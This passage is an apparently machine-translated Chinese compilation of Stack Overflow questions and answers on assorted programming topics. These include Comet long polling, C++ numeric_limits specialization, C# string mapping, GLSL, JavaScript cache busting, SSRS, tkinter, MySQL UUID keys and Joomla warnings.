**总之**：如果您正在考虑在 Apache 上使用 PHP 构建您的解决方案，那么保持打开的持久连接（HTTP 长轮询或流式传输）将很快耗尽资源（效率非常低）。因此，您最好使用[托管解决方案](http://www.leggetter.co.uk/real-time-web-technologies-guide#hosted-services)（*免责声明 - 我为托管解决方案工作）。

HTTP-Long polling 和 HTTP Streaming 是已经被 Server-Sent Events 和 WebSockets 取代的解决方案。因此，在可能的情况下（在 Web 客户端提供支持的情况下），您应该在回退到基于 HTTP 的解决方案之前使用这些解决方案之一。一个好的实时网络技术会自动为你处理这个问题。

由于您的图表显示您正在订阅多个数据流，您还应该考虑一个自然适合此的[发布/订阅解决方案。](http://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern)同样，一个好的实时网络技术解决方案将为您提供这一点。

另请参阅[实时网络技术指南](http://www.leggetter.co.uk/real-time-web-technologies-guide)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-22T18:17:45.440

我认为您正在寻找的通常称为[Comet](http://en.wikipedia.org/wiki/Comet_%28programming%29)。这种技术通常适用于以下情况：

*   客户端（Web 浏览器）向服务器发出请求以获取新数据。这不是重新加载页面，而是在 JavaScript 中完成
*   当服务器有一些数据给客户端时，服务器会响应请求。同样，这不会影响 UI，因为重新加载的不是页面本身：数据的加载是在 JavaScript 代码中“在后台”完成的。
*   在服务端，请求等待新数据，并在可用时返回新数据，或者如果达到超时间隔（在服务器上定义）则不返回任何内容。此超时通常设置为低于浏览器 HTTP 超时。这样做的原因是服务器可以知道特定客户端是否获得了特定数据。如果在客户端允许请求超时，那么在客户端超时后，原始请求可能会被服务器响应，并且客户端不会得到数据，即使服务器认为它确实如此。

数据确实通常以 JSON 格式传输，但您可以选择您喜欢的任何编码。有关如何执行此操作的示例，请参见[此处。](http://www.zeitoun.net/articles/comet_and_php/start)[Goosh](http://goosh.org/)是这种技术的另一个例子，[Interactive Python Shell](http://shell.appspot.com/)也是如此。所有人的代码都可用。

* * *

在 PHP 方面，您需要创建一个页面来响应这些“后台”JavaScript Comet 请求。它可能与用户加载的页面相同，但为了便于解释，我们假设它不同。因此，用户加载`index.php`并调用 JavaScript Comet 代码`getNewData.php`以检索新数据。

在您的`getNewData.php`情况下，您将需要等待您的事件并返回数据。您不想为此使用轮询，但有一些 PHP 库允许使用各种进程间通信策略来等待事件，[例如参见这个问题](https://stackoverflow.com/questions/7469396/how-to-implement-event-listening-in-php)。您的高级伪代码`getNewData.php`如下所示：

1.  解析 JSON 请求
2.  进入高效的等待状态（有超时），等待你的“新数据可用”事件
3.  上一步是否超时？
    是：发送指示无数据
    的响应 否：发送带有新数据的响应

# c++ - 可以专门化 std::numeric_limits 对于用户定义的类似数字的类？

> ID：16122912
> 
> 赞同：32
> 
> 时间：2013-04-20T17:01:58.473
> 
> 标签：c++, types, numbers, standards

的文档`std::numeric_limits<T>`说它不应该专门用于非基本类型。类似数字的用户定义类型呢？如果我定义自己的类型`T`来表示数值并重载数字运算符，并且由 表示的信息对此`numeric_limits`有意义 - 如果我专门`numeric_limits`研究该类型，会有什么问题吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-05-13T10:18:13.060

## 简短的回答：

去吧，不会有什么不好的事情发生。

## 长答案：

C++ 标准广泛保护`::std`C++11 17.6.4.2.1 中的命名空间，但在第 1 段和第 2 段中特别允许您的情况：

> 如果 C++ 程序将声明或定义添加到命名空间 std 或命名空间 std 内的命名空间，则 C++ 程序的行为是未定义的，除非另有说明。只有当声明依赖于用户定义的类型并且特化满足原始模板的标准库要求并且没有明确禁止时，程序才能将任何标准库模板的模板特化添加到命名空间 std。
> 
> [...]只有当声明依赖于用户定义类型的名称并且实例化满足原始模板的标准库要求时，程序才能显式实例化标准库中定义的模板。

较旧的 C++03 在 17.4.3.1/1 中有类似的定义：

> 除非另有说明，否则 C++ 程序将声明或定义添加到命名空间 std 或命名空间 std 内的命名空间是未定义的。程序可以将任何标准库模板的模板特化添加到命名空间 std。标准库模板的这种特化（完全或部分）会导致未定义的行为，除非声明依赖于用户定义的外部链接名称，并且除非特化满足原始模板的标准库要求。

在通过这个基本的垫脚石之后，您已经指出，C++03 18.2.1/4 禁止`::std::numeric_limits`对某些类型进行专门化：

> 非基本标准类型，例如复杂（26.2.2），不应有专门化。

最新的 C++11 18.3.2.1/4 的措辞略有不同：

> 非算术标准类型，例如`complex<T>`(26.4.2)，不应有特化。

但是，这两种公式都允许对非标准类型进行专门化，`T`也就是说，因为您自己定义了它（正如@BoPersson 已经在评论中指出的那样）。

### 注意事项

C++11 18.3.2.3/1 提示您应该（但不要求您）确保您的专业化拥有所有成员。

此外，您可能希望确保您的专业化不违反 C++11 18.3.2.3/2：

> 在 cv 限定类型 cv T 上的 numeric_limits 特化的每个成员的值应等于在非限定类型 T 上特化的相应成员的值。

这实质上意味着，如果您希望将其专门用于`T`，您也应该这样做`T const`，`T volatile`和`T const volatile`。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2016-07-30T06:22:21.843

只是一个例子：

```
namespace std {
    template<> class numeric_limits<Temperature> {
    public:
       static Temperature lowest() {return Temperature(-273.15f);};
       // One can implement other methods if needed
    };
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-18T01:33:34.033

您可能不会将 std::numeric_limits 专门用于用户定义的类型。用户定义类型不是算术类型。C++ 标准中有明确的规定

> 1 numeric_limits 类模板为 C++ 程序提供了有关**实现的****算术类型**表示的各种属性的信息。

例如

> 4 非算术标准类型，例如**复数**(26.4.2)，不应有特化。

# c# - 哪个优于另一个？（与字符串有关）

> ID：16122914
> 
> 赞同：1
> 
> 时间：2013-04-20T17:02:02.390
> 
> 标签：c#, string, performance, text, indexof

我不知道 String 对象的 IndexOf() 方法是如何工作的，所以我想知道以下 2 个实现中哪个优于另一个：

首先，我想介绍一下这个问题，简单来说，这里实现的函数/方法有一个字符作为唯一参数，它应该给出/返回另一个与传入的字符对应的字符。（匹配规则源字符集合和目标字符集合如下所示）：

> a <=> 9
> b <=> 8
> c <=> 7
> d <=> 6
> e <=> 5
> f <=> 4
> g <=> 3
> h <=> 2
> i <=> 1
> j <=> 0

请注意，上述规则只是为了易于遵循而制定的，它不是固定规则，它可以是任何规则，因此不要基于该规则以其他方式实现这些方法。

现在是我想比较的两种方法：

# 1.第一个很短，基于IndexOf()

```
string source = "abcdefghij";
string destination = "9876543210";
public char SourceToDest(char c){
    return destination[source.IndexOf(c)];//Suppose the c is always in source.
} 
```

# 2.第二个较长，使用switch case：

```
public char SourceToDest(char c){
  switch(c){
     case 'a': return '9';
     case 'b': return '8';
     case 'c': return '7';
     case 'd': return '6';
     case 'e': return '5';
     case 'f': return '4';
     case 'g': return '3';
     case 'h': return '2';
     case 'i': return '1';
     case 'j': return '0';
  }
} 
```

正如我之前提到的，该规则是为了易于遵循而制定的，如果没有注意到这一点，您可能还有这样的另一种方法：

```
public char SourceToDest(char c){
    return (char)(154 - (int)c); //154 = 106 + 48
} 
```

如果您有另一种方法优于我介绍的两种方法，请与我分享。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T17:34:57.173

您可以使另一种方法更容易遵循，并且仍然很快：

```
public char SourceToDest(char c)
{
    return (char)((int)'j' - (int)c + (int)'0');
} 
```

另一种选择是：

```
const string destination = "9876543210";
public char SourceToDest(char c)
{
    return destination[(int)c - (int)'a'];
} 
```

这将比您的其他两种方法更快。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T17:23:54.613

你可以`SortedDictionary<char, char>`在你的情况下使用。搜索`SortedDictionary`是`O(log n)`. 在字符串中搜索`IndexOf`我猜应该是`O(n)`，我不认为它有一些特殊的优化（至少 MSDN 没有告诉你）。所以你的例子将是

```
SortedDictionary<char, char> encoding = new SortedDictionary<char, char>()
                       {
                         { 'a', '9' }, { 'b', '8' } /* ... */ , { 'j', '0' }
                       }

public char SourceToDest(char c){
    return encoding[c];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T17:27:00.007

一般来说，对于 large(r) 字符串长度 N，第一个将是 O(N)，因为它是线性搜索，而第二个将是 O(1) 作为索引访问。

对于较小的（er）字符串长度 N，渐近性能被常数因子所淹没，您必须测量数亿次访问才能获得有意义的比较。但你会在乎这些情况吗？当然，在应用程序中还有几十个更高效的性能案例需要研究。

# c# - 如何检查程序是否以兼容模式运行并在标题栏中显示模式

> ID：16122915
> 
> 赞同：2
> 
> 时间：2013-04-20T17:02:09.123
> 
> 标签：c#

我的程序需要在 XP 兼容模式下运行。我需要一种方法来检查是否在 XP 兼容模式下运行。如果不告诉用户以兼容模式运行它。我已经搜索但没有找到答案。我已经尝试过了，`this.Text = System.Environment.OSVersion.VersionString;`但它返回的是 Microsoft Windows NT 6.1.7601 Service Pack 1 而不是模拟的 XP。

（编辑）

在更多的搜索和 dll 导入之后，它总是会返回 Microsoft Windows NT 6.1.7601 Service Pack 1。所以我创建了一个加载控制台来处理注册表，然后运行我的程序。

```
using System;
using System.Security.Permissions;
using Microsoft.Win32;

[assembly: RegistryPermissionAttribute(SecurityAction.RequestMinimum, ViewAndModify = "HKEY_CURRENT_USER")]

class RegKey
{
    static void Main()
    {
        int Major = Environment.OSVersion.Version.Major;
        int Minor = Environment.OSVersion.Version.Minor;

        if (Major == 5 && Minor == 1)
        {   
            System.Diagnostics.Process.Start(System.IO.Directory.GetCurrentDirectory() + "\\MyApp.exe");
        }
        else if (Major > 5)
        {
            if (System.IO.File.Exists(System.IO.Directory.GetCurrentDirectory() + "\\MyApp.exe"))
            {
                RegistryKey Rkey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers");
                //Creates Name And Value
                Rkey.SetValue(System.IO.Directory.GetCurrentDirectory() + "\\MyApp.exe", "WINXPSP3");
                //Starts App.
                 System.Diagnostics.Process.Start(System.IO.Directory.GetCurrentDirectory() + "\\MyApp.exe", "Load");

                //Waites 500 milliseconds so my program can get the registry info
                //(Not needed any more) 
                //System.Threading.Thread.Sleep(500);

                //Deletes Name And Value
                //(Handled by MyApp.exe to increase load time)
                //Rkey.DeleteValue(System.IO.Directory.GetCurrentDirectory() + "\\MyApp.exe");
            }
            else
            {
                Console.WriteLine("File Not Found!!!");
                Console.WriteLine("( MyApp.exe ) Must Be In Same Directory As The Loader.exe.");
                Console.ReadLine();
            }
        }
    }
} 
```

我以这种方式处理注册表，因此我的程序可以移植并防止注册表项指向任何内容。我支持他们是获得我正在寻找的结果的更好方法。

（编辑 2）

经过更多检查后，我只需要在 64 位系统上运行 XP 兼容模式。32 位系统不需要在 XP 兼容模式下运行。我用平台 x86 编译了我的应用程序。所以这一定与64位系统读取注册表的方式有关。

# opengl - Opengl Shader 基本计算

> ID：16122917
> 
> 赞同：0
> 
> 时间：2013-04-20T17:02:10.510
> 
> 标签：opengl, glsl

操作系统：Win7 VS 2012

显卡：Inter HD 4000

无需任何计算即可生成图像。但是，当我为预期投影添加 p*vPosition 时，我的窗口在执行程序后立即打开和关闭。谁能指出我做错了什么？我的 vshsader.glsl 代码如下所示：

```
#version 150

in  vec4 vPosition;
in  vec4 vColor;
out vec4 color;

void main() 
{
    float d = -10.0;
    mat4 p = mat4( 1.0, 0.0, 0.0, 0.0
                   0.0, 0.0, 1.0, 0.0
                   0.0, 0.0, 1.0, 0.0
                   0.0, 0.0, 1/d, 0.0);

  gl_Position = p*vPosition;
  color = vColor;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-21T02:42:51.307

您在 mat4 构造函数的每行参数的末尾缺少逗号。

它应该是：

```
mat4 p = mat4( 1.0, 0.0, 0.0, 0.0, // <- end with comma
               0.0, 0.0, 1.0, 0.0, // <- end with comma
               0.0, 0.0, 1.0, 0.0, // <- end with comma
               0.0, 0.0, 1/d, 0.0); 
```

# javascript - 加载外部文件变量，同时避免浏览器外部文件缓存

> ID：16122921
> 
> 赞同：0
> 
> 时间：2013-04-20T17:02:43.800
> 
> 标签：javascript, scope

我需要将时间戳附加到标记 url 中的 javaScript 文件以避免缓存。

在stackoverflow中找到的这个函数似乎可以做到：

```
<script type="text/javascript">
(function(){ 
 var randomh=Math.random();
 var e = document.getElementsByTagName("script")[0];
 var d = document.createElement("script");
 d.src = "TESTINGX.JS?x="+randomh+"";
 d.type = "text/javascript"; 
 d.async = true;
 d.defer = true;
 e.parentNode.insertBefore(d,e); 
```

})();

但问题是在 testingx.js 文件中，我放置了以下代码：

```
var hello = "Hello World!"; 
```

并且由于某种原因，该变量没有获得全局范围（或​​者问题可能是其他问题）。

我的html如下：

```
<!DOCTYPE html>
<HTML><HEAD>

<script type="text/javascript">
(function(){ 
     var randomh=Math.random();
     var e = document.getElementsByTagName("script")[0];
     var d = document.createElement("script");
     d.src = "TESTINGX.JS?x="+randomh+"";
     d.type = "text/javascript"; 
     d.async = true;
     d.defer = true;
     e.parentNode.insertBefore(d,e);
 })();
</script>

</HEAD><BODY>

<h1>WiFi Mini Web Server</h1>

<script>
document.write(hello); //hello var is contained in the TESTINGX.JS file\n\
</script>
</BODY></HTML> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:27:27.987

您为缓存清除编写代码，也恰好确保脚本以“惰性”、“非阻塞”方式加载。这意味着在您的 DOM`TESTING.js`加载*后加载。*这也意味着`document.write`脚本在 js 文件加载之前运行，并将所需的 var 添加到全局范围。

可以有几种解决方案： 1.从您的加载脚本中删除`defer`和`async`

1.  确保仅在实际加载脚本后才能在页面上访问脚本中的变量

2.  更好的是，不要尝试通过聪明的 javascript 来处理缓存破坏（我假设 html 问题是使用某种服务器技术（如 jsp 或 php 脚本）提供的）。使用服务器技术在html中常用的script标签中添加一个带有随机数或时间戳的参数

3.  不要使用脚本来破坏缓存，而是使用普通的脚本标签，其参数与以毫秒为单位的时间戳相同，就像您进行构建的那一天一样，并嵌入到您的微控制器/服务器中。将其视为 js 文件的版本号。因此，只要版本号是最新的，客户端就可以使用缓存在浏览器中的文件。

这个蚂蚁任务[http://code.google.com/p/ant-web-tasks/wiki/CacheBusting](http://code.google.com/p/ant-web-tasks/wiki/CacheBusting)是实现第 4 点的好方法。我有很好的经验。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T17:55:25.137

如果您希望外部脚本在加载之前阻止其他所有内容，但仍需要从动态 URL 加载它（听起来像您这样做），您应该能够`document.write`直接使用脚本元素而不是使用 DOM 方法。

```
<!DOCTYPE html>
<html><head>

<script>
var randomh = Math.random();
document.write('<script src="TESTINGX.JS?x=' + randomh + '"></' + 'script>');
</script>

</head><body>

<h1>WiFi Mini Web Server</h1>

<script>
document.write(hello); // hello var is contained in the TESTINGX.JS file
</script>

</body></html> 
```

[http://jsbin.com/ixagud/2/edit](http://jsbin.com/ixagud/2/edit)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T17:04:03.793

尝试这个

```
 <script type="text/javascript">
(function(){ 
     var randomh=Math.random();
     var e = document.getElementsByTagName("script")[0];
     var d = document.createElement("script");
     d.src = "TESTINGX.JS?x="+randomh+"";
     d.type = "text/javascript"; 
     d.async = true;
     d.defer = true;
     e.parentNode.insertBefore(d,e);
document.write(hello);
 })();
</script> 
```

# reporting-services - SSRS 2008 过滤多值参数以在报表标题中显示

> ID：16122922
> 
> 赞同：1
> 
> 时间：2013-04-20T17:02:52.533
> 
> 标签：reporting-services, ssrs-2008

我有一个多值参数 (Param_Locations)，用户可以从中选择多个服务位置（例如 LocationA、LocationA 眼镜店、LocationB、LocationB 眼镜店……）。这些位置的选择对于我将要生成的数据集很重要。然后，我可以使用 =Join(Parameters!Param_Locations.Label) 在报告标题中显示所选位置。

我遇到的问题是我想过滤掉标签中包含“光学”一词的任何位置。我不希望这些位置显示在报告标题中，即使它们可能已从下拉选择列表中选择。

我尝试使用 Filter() 函数无济于事。任何想法，将不胜感激。

问候！巴巴克 C 凤凰城，亚利桑那州

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-22T16:48:15.203

您尝试过滤方法是正确的。我在 SQL Server 2012 SP1 中成功测试了以下代码。

```
=Join(Filter(Parameters!Param_Locations.Label, "Optical Shop", False), ", ") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T19:17:47.673

我会使用自定义代码来做到这一点；尝试使用本机函数有点过于复杂，但您可以在自定义代码中轻松循环参数标签：

```
Public Function ShowParameterValues(ByVal parameter as Parameter) as String

  Dim s as String 

  For i as integer = 0 to parameter.Count-1

    If InStr(CStr(parameter.Label(i)), "Optical") = 0
      s = s + CStr(parameter.Label(i)) + ", " 
    End If

  Next

  s = Mid(s, 1, Len(s) - 2)

  Return s

End Function 
```

当要显示过滤后的参数标签时，在报表中调用这样的函数：

```
=Code.ShowParameterValues(Parameters!Param_Locations) 
```

有关更多详细信息，请参阅[使用自定义代码](http://msdn.microsoft.com/en-us/library/ms155798%28v=sql.100%29.aspx)。

# javascript - jQuery DataTables 每列添加国家图标

> ID：16122924
> 
> 赞同：6
> 
> 时间：2013-04-20T17:02:57.547
> 
> 标签：javascript, jquery, jquery-datatables

我想在[DataTables](http://www.datatables.net/)中的每一列（使用 jQuery）上添加一个[国家图标](http://www.famfamfam.com/lab/icons/flags/)`country`，该图标与该列上显示的文本相同。

因此，当它包含国家 US 时，在链接到的文本之前会有一个图像`us.png`。

所以，从这里：

![没有标志图标的行](https://i.stack.imgur.com/fwhm3.png)

对此：

![带有标志图标的行](https://i.stack.imgur.com/87NkT.png)

[（在 Chrome DevTools 中编辑）]

我认为它可以用 来完成[`aaData`](http://datatables.net/ref#aaData)，但我不知道如何在不替换整个列的情况下使用它。

有人有答案吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T17:18:04.427

使用`fnRowCallback`.

[请参阅数据表文档http://datatables.net/release-datatables/examples/advanced_init/row_callback.html](http://datatables.net/release-datatables/examples/advanced_init/row_callback.html)中的此示例

# python - 我的简单 tkinter 计算器脚本仅在通过 IDLE 运行时才有效。为什么？

> ID：16122926
> 
> 赞同：2
> 
> 时间：2013-04-20T17:03:04.233
> 
> 标签：python, tkinter, python-idle

我在 python 3.3 上使用 tkinter 编写了一个（非常）简单的计算器脚本。当我通过 IDLE 运行脚本时，它似乎工作正常；但是，当我通过简单地双击 .py 文件运行它时，它不起作用。cmd窗口弹出半秒后又消失。

我尝试使用“pythoncalculator.py”通过命令提示符启动它，但这也不起作用。但是，键入“python”以在 cmd 中调出 python 解释器，然后导入计算器工作正常。

在谷歌上搜索了这个问题并查看了一些类似的 stackOverflow 问题后，我认为它们都没有真正解决这个问题。这不是第一次，大约一周前，我为我的 USB 记忆棒编写了一个 python 安全插件，它获取密码并检查它们与哈希等的对比，并在 USB 记忆棒上安装了 python。前几天它停止了工作，当我用 PythonW 打开它时，什么也没发生，我不得不一直用 IDLE 打开它并从那里启动它。

我已经附上了我的计算器的代码 - 我意识到它效率低下并且编码非常糟糕，但我还没有清理它。

```
from tkinter import *
class calculator:
    def __init__(self):
        self.root = Tk()
        self.menu = Menu(self.root)
        self.menu.add_command(label="Quit", command=self.root.destroy) 
        self.root.config(menu=self.menu)
        self.root.title("Calculator")
        self.display = Entry(self.root)
        self.display.grid(row=1, column=0, columnspan=5)
        self.dot = False
        self.equalsdone = False
        Label(self.root).grid(row=2, column=0)
        Button(self.root, text="1", width=5, foreground="blue", command=lambda: self.addNumber("1")).grid(row=4, column=0)
        Button(self.root, text="2", width=5, foreground="blue", command=lambda: self.addNumber("2")).grid(row=4, column=1)
        Button(self.root, text="3", width=5, foreground="blue", command=lambda: self.addNumber("3")).grid(row=4, column=2)
        Button(self.root, text="4", width=5, foreground="blue", command=lambda: self.addNumber("4")).grid(row=5, column=0)
        Button(self.root, text="5", width=5, foreground="blue", command=lambda: self.addNumber("5")).grid(row=5, column=1)
        Button(self.root, text="6", width=5, foreground="blue", command=lambda: self.addNumber("6")).grid(row=5, column=2)
        Button(self.root, text="7", width=5, foreground="blue", command=lambda: self.addNumber("7")).grid(row=6, column=0)
        Button(self.root, text="8", width=5, foreground="blue", command=lambda: self.addNumber("8")).grid(row=6, column=1)
        Button(self.root, text="9", width=5, foreground="blue", command=lambda: self.addNumber("9")).grid(row=6, column=2)
        Button(self.root, text="0", width=5, foreground="blue", command=lambda: self.addNumber("0")).grid(row=7, column=1)
        Button(self.root, text=".", width=5, command=lambda: self.addNumber(".")).grid(row=7, column=0)
        Button(self.root, text="=", width=12, command=lambda: self.Equals()).grid(row=8, column=2, columnspan=2)
        Button(self.root, text="(", width=5, foreground="red", command=lambda: self.addNumber("(")).grid(row=8, column=0)
        Button(self.root, text=")", width=5, foreground="red", command=lambda: self.addNumber(")")).grid(row=8, column=1)
        Button(self.root, text="X", width=5, foreground="red", command=lambda: self.addNumber("x")).grid(row=4, column=3)
        Button(self.root, text="÷", width=5, foreground="red", command=lambda: self.addNumber("÷")).grid(row=5, column=3)
        Button(self.root, text="-", width=5, foreground="red", command=lambda: self.addNumber("-")).grid(row=6, column=3)
        Button(self.root, text="+", width=5, foreground="red", command=lambda: self.addNumber("+")).grid(row=7, column=3)
        Button(self.root, text="C", width=5, command=lambda:self.clear("all")).grid(row=3, column=3)
        Button(self.root, text="Del.", width=5, command=lambda:self.clear("1")).grid(row=3, column=2)
    def clear(self, amount):
        if amount == "all":
            self.display.delete(0, END)
        elif amount == "1":
            if self.equalsdone == True:
                self.equalsdone = False
                y = self.display.get()
                yAct = y[1:]
                self.display.delete(0, END)
                self.display.insert(0, yAct)
                self.display.delete(len(yAct)-1, END)
            else:
                z = len(self.display.get())
                self.display.delete(z-1, END) 
    def addNumber(self, number):
        if self.equalsdone == True:
            self.equalsdone = False
            if number == "x" or  number == "÷" or  number == "+" or  number == "-":
                y = self.display.get()
                yAct = y[1:]
                self.display.delete(0, END)
                self.display.insert(0, yAct)
                self.display.insert(END, number)
            else:
                self.display.delete(0, END)
                self.display.insert(0, number)
        elif number == ".":
            if self.dot == True:
                pass
            else:
                self.dot = True
                self.display.insert(END, number)
        elif number == "x" or number == "-"or number == "+"or number == "÷":
            self.dot = False
            self.display.insert(END, number)
        else:
            self.display.insert(END, number)     
    def doEquation(self, operator):
        def setwaiting(operator):
            if operator == "x":
                self.waitingx = True
            if operator == "÷":
                self.waitingd = True
            if operator == "+":
                self.waitingp = True
            if operator == "-":
                self.waitingt = True
        if self.waiting == False:
            self.waiting = True
            setwaiting(operator)
        elif self.waitingx == True:
            self.waitingx = False
            setwaiting(operator)
            self.no1f = float(self.no1)
            self.no2f = float(self.no2)
            x = self.no1f*self.no2f
            self.no1 = str(x)
            self.no2 = ""
            print(self.no1)
        elif self.waitingd == True:
            self.waitingd = False
            setwaiting(operator)
            self.no1f = float(self.no1)
            self.no2f = float(self.no2)
            x = self.no1f/self.no2f
            self.no1 = str(x)
            self.no2 = ""
            print(self.no1)
        elif self.waitingt == True:
            self.waitingt = False
            setwaiting(operator)
            self.no1f = float(self.no1)
            self.no2f = float(self.no2)
            x = self.no1f-self.no2f
            self.no1 = str(x)
            self.no2 = ""
            print(self.no1)
        elif self.waitingp == True:
            self.waitingp = False
            setwaiting(operator)
            self.no1f = float(self.no1)
            self.no2f = float(self.no2)
            x = self.no1f+self.no2f
            self.no1 = str(x)
            self.no2 = ""
            print(self.no1)
        else:
            setwaiting(operator)
    def Equals(self):
        self.length = len(self.display.get())
        self.equation = self.display.get()
        self.waiting = False
        self.no1 = ""
        self.no2 = ""
        self.lena = 0
        self.waitingx = False
        self.waitingd = False
        self.waitingt = False
        self.waitingp = False
        for item in self.equation:
            self.lena += 1
            if item == "x":
                self.doEquation(operator="x")
            elif item == "÷":
                self.doEquation(operator="÷")
            elif item == "-":
                self.doEquation(operator="-")
            elif item == "+":
                self.doEquation(operator="+")
            else:
                if self.waiting == False:
                    self.no1 += item
                elif self.waiting == True:
                    self.no2 += item
            if self.lena == self.length:
                self.doEquation(operator=False)
        self.display.delete(0, END)
        self.display.insert(0, "=" + self.no1)
        self.equalsdone = True
calculator() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T19:40:49.843

您需要调用`mainloop`根窗口的方法。IDLE 会自动为您执行此操作（或作为其实现方式的副作用；我不确定是哪个）。在您的情况下，您可能希望将此作为类`__init__`方法中的最后一条语句`calculator`。

`mainloop`是工作 Tkinter 应用程序的基础。它监听来自键盘、鼠标和操作系统的事件并将它们转发给适当的回调。如果没有这个事件循环，就不会处理任何事件，如果没有处理任何事件，窗口就不能在屏幕上绘制自己。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-22T23:51:14.220

IDLE 在编辑器中运行 file.py，就像用户`python -i file.py`在控制台中运行一样。该`-i`选项使程序保持活动状态，因此您可以与之交互。所以你必须在控制台中使用 -i file.py，如果你想在它运行后与它进行交互，或者添加 root.mainloop 以保持程序活着。

# alfresco - 如何在露天共享中实现网站的 RSS 提要？

> ID：16122929
> 
> 赞同：0
> 
> 时间：2013-04-20T17:03:07.047
> 
> 标签：alfresco, alfresco-share

我仍在户外学习并尝试让提要小板显示共享中的自定义提要。最终目标是拥有某种工作流程，其中在 alfresco 中对站点页面上的某些组件进行编辑会生成一个提要元素，然后该提要小板将拾取该提要元素。现在为了进行测试，我创建了一个 xml 提要文件，并将其放在设置为公共的协作站点的文档空间中，并将其链接放在提要 dashlet 配置中，但这不起作用。反正有没有实现我所追求的功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T22:12:00.337

有2个选项：

1.  创建您自己的 Dashlet。当前的 RSS-Feed Dashlet 连接到 http 连接器（share-config-custom.xml），这是一个需要身份验证的外部连接器。所以复制 RSS-Feed Dashlet 并撕掉这部分。
2.  根据这个[JIRA 增强功能](https://issues.alfresco.com/jira/browse/MNT-2322)，在 Alfresco Enterprise 4.1.4 中，您可以阅读内部共享提要！所以这意味着您可能不必进行任何自定义。因此，获取企业树的 SVN/GIT 源并使用 Alfresco 的代码来构建 Dashlet 或扩展/覆盖它。

# php - 将大（UUID）作为 MySQL 表主键处理的最佳方法

> ID：16122934
> 
> 赞同：10
> 
> 时间：2013-04-20T17:03:44.357
> 
> 标签：php, mysql, hex, decimal

我有一个要用作 MySQL 表主键的 UUID 字符串，UUID 是一个 32 个字符的十六进制字符串（在去除“-”字符之后）。由于最好使用数字列 (int) 作为数据库中的主键，我想将其转换为整数，但不确定处理它的最佳方法。

1.  由于字符串的大小（即 uuid='a822ff2bff02461db45ddcd10a2de0c2'），我是否需要将其分解为多个“子字符串”。
2.  我目前在 32 位架构上运行 PHP，因此由于 PHP_INT_MAX 大小（最大 0xFFFFFFFF），在 PHP 中转换它不起作用。我怀疑这对 MySQL 来说是同样的限制。
3.  我不喜欢使用多个主键来解决这个问题，我宁愿使用字符串表示，即使这不是首选方法。

我可能认为这一切都是错误的，并且不反对阅读文档，因此可以接受示例或建议阅读作为回应。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-04-20T17:22:50.990

大多数情况下，最好将 UUID/GUID 存储为`BINARY(16)`. 请参阅这些相关的 StackOverflow 问题：

*   [MySQL 中的 UUID 性能](https://stackoverflow.com/questions/2365132/uuid-performance-in-mysql/2365176)
*   [如何将 UUID 存储为数字](https://stackoverflow.com/questions/10950202/how-to-store-uuid-as-number)

转换可以（并且可能应该）在 MySQL 而不是 PHP 中完成，因此无论您使用 32 位 PHP 客户端还是 64 位都无关紧要（双关语：P）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T17:04:45.853

使用字符串类型，而不是整数。只有解决问题才能更好。

如果您真的关心查找速度，请使用合成（自动增量）主键。您可以在 UUID 列上放置唯一约束，并仅使用一次来查找随后用于连接等的合成键。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-02T15:28:16.050

它也取决于存储引擎。TokuDB 应该处理所有这些问题。

# php - Joomla 网站抛出错误

> ID：16122935
> 
> 赞同：3
> 
> 时间：2013-04-20T17:03:48.773
> 
> 标签：php, joomla

前一段时间，我在第三方服务器上创建了一个 Joomla 网站。现在，当我尝试访问该网站时，我看到如下错误：

```
Strict Standards: Non-static method JLoader::import() should not be called statically in /home/chinfote/public_html/libraries/joomla/import.php on line 29

Strict Standards: Non-static method JLoader::register() should not be called statically in /home/chinfote/public_html/libraries/loader.php on line 71

Strict Standards: Non-static method JLoader::import() should not be called statically in /home/chinfote/public_html/libraries/joomla/import.php on line 32

Strict Standards: Non-static method JLoader::register() should not be called statically in /home/chinfote/public_html/libraries/loader.php on line 71

Strict Standards: Non-static method JLoader::load() should not be called statically in /home/chinfote/public_html/libraries/loader.php on line 161

Strict Standards: Non-static method JLoader::register() should not be called statically in /home/chinfote/public_html/libraries/loader.php on line 138

Strict Standards: Non-static method JRequest::clean() should not be called statically in /home/chinfote/public_html/libraries/joomla/import.php on line 33

Strict Standards: Non-static method JRequest::_cleanArray() should not be called statically in /home/chinfote/public_html/libraries/joomla/environment/request.php on line 463 
```

在网上搜索后，我发现我应该对 php.ini 文件进行一些更改。但是在cpanel的文件管理器上，我找不到这个文件。谁能帮我找到这个文件并解决这些错误。或者有没有其他方法可以解决上述问题？？

提前谢谢了。

~贾纳维

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2015-05-30T02:37:07.773

Joomla 1.5 在 PHP 5.4 中工作。

**您可以将此代码index.php**粘贴到前端和后端。这个对我有用！

// 设置这是一个父文件的标志

```
define( '_JEXEC', 1 );

error_reporting( E_ERROR | E_PARSE | E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_COMPILE_WARNING ); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-21T11:21:06.867

抑制警告**与修复**警告不同。

